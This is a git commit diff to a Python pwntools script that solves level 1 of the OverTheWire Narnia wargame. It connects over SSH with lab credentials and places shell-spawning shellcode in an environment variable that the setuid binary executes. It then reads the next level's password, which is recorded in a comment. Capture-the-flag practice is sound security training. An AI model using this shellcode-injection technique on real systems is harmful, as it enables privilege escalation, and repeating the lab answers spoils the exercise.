2bf06e56b186eeafb8a7c64425194858fa0611d1
defstryker <defstryker@hotmail.com>
2016-09-29 18:58:15 +0800

    narnia level 2

--- overthewire/narnia/level1.py
+++ overthewire/narnia/level1.py
@@ -1,17 +1,23 @@
 from pwn import *
-
+context.os = 'linux'
+context.arch = 'x86'
 # vars ...
 user = 'narnia1'
 host = 'narnia.labs.overthewire.org'
 password = 'efeidiedae'
 shell = ssh(user, host, password=password)
-sh = shell.run('bash')
-sh.recvuntil('$ ')
 ############################################
-sh.sendline('cd /narnia/')
-sh.recvuntil('$ ')
-sh.sendline('./narnia1')
-log.info(sh.recv(timeout=10).decode())
+s = shell.process('/narnia/narnia1',
+    env = {'EGG': asm(shellcraft.i386.linux.sh())})
+s.recvuntil('$ ').decode()
+s.sendline('whoami')
+t = s.recvuntil('$ ').decode()[:7]
+log.info('current user: ' + t)
+if t == 'narnia2':
+    s.sendline('cat /etc/narnia_pass/narnia2')
+    log.success(s.recvuntil('$ ').decode().strip()[:-1])
+else:
+    log.critical('Exploit failed!!!')
 
 
-#pass
+#pass nairiepecu
